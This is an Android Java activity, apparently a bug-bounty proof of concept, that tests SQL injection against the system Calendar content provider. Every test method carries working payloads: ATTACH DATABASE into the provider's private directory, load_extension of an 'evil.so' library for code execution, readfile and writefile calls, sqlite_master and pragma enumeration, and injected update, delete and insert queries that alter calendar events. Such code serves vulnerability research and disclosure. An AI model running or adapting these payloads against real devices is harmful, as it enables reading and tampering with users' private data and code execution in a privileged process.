package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class AdvancedSqliActivity extends Activity {
    private static final String TAG = "AdvancedSQLi";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(10);
        logView.setText("Advanced SQLi Escalation Tests\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);

        testAttachDatabase();
        testLoadExtension();
        testSqliteFunctions();
        testWritefileFunc();
        testCalendarWriteOps();
        testOtherCalendarUris();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void testAttachDatabase() {
        log("=== Test 1: ATTACH DATABASE (file access escalation) ===");
        Uri uri = Uri.parse("content://com.android.calendar/calendars");
        String[] payloads = {
            "1=0); ATTACH DATABASE '/data/data/com.android.providers.calendar/test.db' AS pwn--",
            "1=0) UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 FROM (SELECT 1) WHERE 1=1 AND (SELECT CASE WHEN (SELECT 1) THEN 1 ELSE load_extension('x') END)--"
        };
        for (String payload : payloads) {
            try {
                Cursor c = getContentResolver().query(uri, null, payload, null, null);
                if (c != null) {
                    log("ATTACH payload returned " + c.getCount() + " rows");
                    c.close();
                } else {
                    log("ATTACH: null cursor");
                }
            } catch (Exception e) {
                log("ATTACH error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            }
        }
        log("");
    }

    private void testLoadExtension() {
        log("=== Test 2: load_extension() (code execution) ===");
        Uri uri = Uri.parse("content://com.android.calendar/calendars");
        try {
            String sel = "1=0) UNION SELECT load_extension('/data/local/tmp/evil.so'),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--";
            Cursor c = getContentResolver().query(uri, null, sel, null, null);
            if (c != null) {
                log("load_extension: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("load_extension error: " + e.getMessage());
        }
        // Try via projection subquery
        try {
            String[] proj = {"load_extension('/data/local/tmp/evil.so') AS x"};
            Cursor c = getContentResolver().query(uri, proj, null, null, null);
            if (c != null) {
                log("load_extension via projection: " + c.getCount() + " rows");
                c.close();
            }
        } catch (Exception e) {
            log("load_extension projection error: " + e.getMessage());
        }
        log("");
    }

    private void testSqliteFunctions() {
        log("=== Test 3: SQLite function enumeration ===");
        Uri uri = Uri.parse("content://com.android.calendar/calendars");
        // Check sqlite version
        try {
            String[] proj = {"sqlite_version() AS ver"};
            Cursor c = getContentResolver().query(uri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                log("SQLite version: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("sqlite_version error: " + e.getMessage());
        }
        // Check available pragmas
        String[] pragmas = {"database_list", "table_info('Events')", "compile_options"};
        for (String pragma : pragmas) {
            try {
                String sel = "1=0) UNION SELECT * FROM pragma_" + pragma + "--";
                Cursor c = getContentResolver().query(uri, null, sel, null, null);
                if (c != null) {
                    log("pragma_" + pragma + ": " + c.getCount() + " rows");
                    c.close();
                }
            } catch (Exception e) {
                log("pragma_" + pragma + " error: " + e.getMessage());
            }
        }
        // Try to read compile options via subquery (to check if extensions enabled)
        try {
            String[] proj = {"(SELECT group_concat(compile_options, '|') FROM pragma_compile_options) AS opts"};
            Cursor c = getContentResolver().query(uri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String opts = c.getString(0);
                log("SQLite compile options: " + opts);
                c.close();
            }
        } catch (Exception e) {
            log("compile_options error: " + e.getMessage());
        }
        log("");
    }

    private void testWritefileFunc() {
        log("=== Test 4: writefile() / readfile() functions ===");
        Uri uri = Uri.parse("content://com.android.calendar/calendars");
        // Try readfile to read arbitrary files
        try {
            String[] proj = {"hex(readfile('/etc/hosts')) AS data"};
            Cursor c = getContentResolver().query(uri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                String data = c.getString(0);
                log("readfile(/etc/hosts): " + (data != null ? data.substring(0, Math.min(data.length(), 100)) : "null"));
                c.close();
            }
        } catch (Exception e) {
            log("readfile error: " + e.getMessage());
        }
        // Try writefile
        try {
            String[] proj = {"writefile('/data/data/com.android.providers.calendar/pwned.txt', 'PWNED') AS result"};
            Cursor c = getContentResolver().query(uri, proj, null, null, null);
            if (c != null && c.moveToFirst()) {
                log("writefile result: " + c.getString(0));
                c.close();
            }
        } catch (Exception e) {
            log("writefile error: " + e.getMessage());
        }
        log("");
    }

    private void testCalendarWriteOps() {
        log("=== Test 5: Calendar write operations with SQLi ===");
        Uri uri = Uri.parse("content://com.android.calendar/events");
        // Try update() with SQLi in selection
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("title", "SQLI_MODIFIED");
            int updated = getContentResolver().update(uri, cv,
                "1=1 OR _id IN (SELECT _id FROM Events WHERE _id=2)--", null);
            log("Update with SQLi: " + updated + " rows affected");
        } catch (Exception e) {
            log("Update SQLi error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        // Try delete with SQLi
        try {
            int deleted = getContentResolver().delete(uri,
                "_id=-999 OR 1=0--", null);
            log("Delete with SQLi: " + deleted + " rows affected");
        } catch (Exception e) {
            log("Delete SQLi error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        // Try insert with SQLi in column value (unlikely but worth testing)
        try {
            android.content.ContentValues cv = new android.content.ContentValues();
            cv.put("calendar_id", 1);
            cv.put("title", "Normal Title');--");
            cv.put("dtstart", 1788724078000L);
            cv.put("dtend", 1788727678000L);
            cv.put("eventTimezone", "UTC");
            Uri result = getContentResolver().insert(uri, cv);
            log("Insert with embedded SQLi: " + result);
            if (result != null) {
                // Clean up
                getContentResolver().delete(result, null, null);
                log("  Cleaned up test event");
            }
        } catch (Exception e) {
            log("Insert error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testOtherCalendarUris() {
        log("=== Test 6: Other Calendar Provider URIs with SQLi ===");
        String[] uris = {
            "content://com.android.calendar/events",
            "content://com.android.calendar/attendees",
            "content://com.android.calendar/reminders",
            "content://com.android.calendar/calendar_alerts",
            "content://com.android.calendar/instances/when/0/9999999999999",
            "content://com.android.calendar/event_entities",
            "content://com.android.calendar/colors"
        };
        for (String uriStr : uris) {
            try {
                Uri uri = Uri.parse(uriStr);
                Cursor normal = getContentResolver().query(uri, null, null, null, null);
                int cols = 0;
                if (normal != null) {
                    cols = normal.getColumnCount();
                    log(uriStr + ": " + normal.getCount() + " rows, " + cols + " cols");
                    normal.close();
                }
                if (cols > 0) {
                    StringBuilder sb = new StringBuilder("1=0) UNION SELECT sql");
                    for (int i = 2; i <= cols; i++) sb.append(",").append(i);
                    sb.append(" FROM sqlite_master WHERE type='table'--");
                    Cursor sqli = getContentResolver().query(uri, null, sb.toString(), null, null);
                    if (sqli != null && sqli.getCount() > 0) {
                        log("  VULNERABLE! SQLi returned " + sqli.getCount() + " rows");
                    } else if (sqli != null) {
                        log("  SQLi: 0 rows (might be safe)");
                    }
                    if (sqli != null) sqli.close();
                }
            } catch (Exception e) {
                log(uriStr + " error: " + e.getClass().getSimpleName());
            }
        }
        log("");
    }
}
